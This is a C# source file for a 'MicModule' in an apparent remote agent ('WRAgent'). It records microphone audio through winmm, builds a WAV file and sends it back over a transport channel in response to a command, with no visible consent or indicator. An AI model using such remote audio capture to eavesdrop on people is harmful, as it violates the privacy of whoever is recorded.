using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json.Nodes;

namespace WRAgent
{
    /// <summary>Microphone capture through winmm/waveIn â€” no external deps.</summary>
    internal static class MicModule
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct WAVEFORMATEX
        {
            public ushort wFormatTag;
            public ushort nChannels;
            public uint nSamplesPerSec;
            public uint nAvgBytesPerSec;
            public ushort nBlockAlign;
            public ushort wBitsPerSample;
            public ushort cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct WAVEHDR
        {
            public IntPtr lpData;
            public uint dwBufferLength;
            public uint dwBytesRecorded;
            public IntPtr dwUser;
            public uint dwFlags;
            public uint dwLoops;
            public IntPtr lpNext;
            public IntPtr reserved;
        }

        private const int WAVE_MAPPER = -1;
        private const uint WHDR_DONE = 0x00000001;
        private const int WAVE_FORMAT_PCM = 1;

        [DllImport("winmm.dll")] private static extern int waveInGetNumDevs();
        [DllImport("winmm.dll")] private static extern int waveInOpen(out IntPtr hwi, int id,
            ref WAVEFORMATEX fmt, IntPtr callback, IntPtr instance, uint flags);
        [DllImport("winmm.dll")] private static extern int waveInClose(IntPtr hwi);
        [DllImport("winmm.dll")] private static extern int waveInPrepareHeader(IntPtr hwi, IntPtr hdr, uint size);
        [DllImport("winmm.dll")] private static extern int waveInUnprepareHeader(IntPtr hwi, IntPtr hdr, uint size);
        [DllImport("winmm.dll")] private static extern int waveInAddBuffer(IntPtr hwi, IntPtr hdr, uint size);
        [DllImport("winmm.dll")] private static extern int waveInStart(IntPtr hwi);
        [DllImport("winmm.dll")] private static extern int waveInStop(IntPtr hwi);
        [DllImport("winmm.dll")] private static extern int waveInReset(IntPtr hwi);

        // ------------------------------------------------------------------
        public static async Task<JsonObject> Record(JsonObject args, Transport t)
        {
            var seconds = Math.Clamp(Util.Int(args, "seconds", 10), 1, 120);
            const int rate = 44100;
            const short channels = 1;
            const short bits = 16;
            var block = (ushort)(channels * bits / 8);

            try
            {
                if (waveInGetNumDevs() == 0)
                    return new JsonObject { ["ok"] = false, ["error"] = "no capture device" };

                var fmt = new WAVEFORMATEX
                {
                    wFormatTag = WAVE_FORMAT_PCM,
                    nChannels = (ushort)channels,
                    nSamplesPerSec = rate,
                    nAvgBytesPerSec = (uint)(rate * block),
                    nBlockAlign = block,
                    wBitsPerSample = (ushort)bits,
                    cbSize = 0
                };

                var total = rate * block * seconds;
                var dataPtr = Marshal.AllocHGlobal(total);
                var hdrPtr = Marshal.AllocHGlobal(Marshal.SizeOf<WAVEHDR>());
                var hdrSize = (uint)Marshal.SizeOf<WAVEHDR>();
                var hwi = IntPtr.Zero;
                var opened = false;

                try
                {
                    var rc = waveInOpen(out hwi, WAVE_MAPPER, ref fmt, IntPtr.Zero, IntPtr.Zero, 0);
                    if (rc != 0)
                        return new JsonObject { ["ok"] = false, ["error"] = $"waveInOpen {rc}" };
                    opened = true;

                    var hdr = new WAVEHDR
                    {
                        lpData = dataPtr,
                        dwBufferLength = (uint)total
                    };
                    Marshal.StructureToPtr(hdr, hdrPtr, false);

                    if (waveInPrepareHeader(hwi, hdrPtr, hdrSize) != 0)
                        return new JsonObject { ["ok"] = false, ["error"] = "prepare failed" };
                    if (waveInAddBuffer(hwi, hdrPtr, hdrSize) != 0)
                        return new JsonObject { ["ok"] = false, ["error"] = "add buffer failed" };
                    if (waveInStart(hwi) != 0)
                        return new JsonObject { ["ok"] = false, ["error"] = "start failed" };

                    var sw = Stopwatch.StartNew();
                    while (sw.Elapsed.TotalSeconds < seconds + 2)
                    {
                        var cur = Marshal.PtrToStructure<WAVEHDR>(hdrPtr);
                        if ((cur.dwFlags & WHDR_DONE) != 0) break;
                        await Task.Delay(60).ConfigureAwait(false);
                    }

                    waveInStop(hwi);
                    waveInReset(hwi);

                    var done = Marshal.PtrToStructure<WAVEHDR>(hdrPtr);
                    var recorded = (int)Math.Min(done.dwBytesRecorded, (uint)total);
                    if (recorded < 1024) recorded = Math.Min(total, rate * block * seconds);

                    var pcm = new byte[recorded];
                    Marshal.Copy(dataPtr, pcm, 0, recorded);

                    try { waveInUnprepareHeader(hwi, hdrPtr, hdrSize); } catch { }

                    var wav = Wrap(pcm, rate, channels, bits);
                    var meta = new JsonObject
                    {
                        ["name"] = $"mic-{DateTime.Now:yyyyMMdd-HHmmss}.wav",
                        ["path"] = "<microphone>",
                        ["seconds"] = seconds
                    };
                    await t.EmitBlobAsync("audio", meta, wav).ConfigureAwait(false);

                    return new JsonObject
                    {
                        ["ok"] = true,
                        ["stdout"] = $"recorded {seconds}s ({wav.Length / 1024} KB)"
                    };
                }
                finally
                {
                    try { if (opened) waveInClose(hwi); } catch { }
                    Marshal.FreeHGlobal(dataPtr);
                    Marshal.FreeHGlobal(hdrPtr);
                }
            }
            catch (Exception e)
            {
                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
            }
        }

        // ------------------------------------------------------------------
        private static byte[] Wrap(byte[] pcm, int rate, short channels, short bits)
        {
            using var ms = new MemoryStream();
            using var w = new BinaryWriter(ms, Encoding.ASCII);

            w.Write(Encoding.ASCII.GetBytes("RIFF"));
            w.Write(36 + pcm.Length);
            w.Write(Encoding.ASCII.GetBytes("WAVE"));
            w.Write(Encoding.ASCII.GetBytes("fmt "));
            w.Write(16);
            w.Write((short)WAVE_FORMAT_PCM);
            w.Write(channels);
            w.Write(rate);
            w.Write(rate * channels * bits / 8);
            w.Write((short)(channels * bits / 8));
            w.Write(bits);
            w.Write(Encoding.ASCII.GetBytes("data"));
            w.Write(pcm.Length);
            w.Write(pcm);
            w.Flush();
            return ms.ToArray();
        }
    }
}

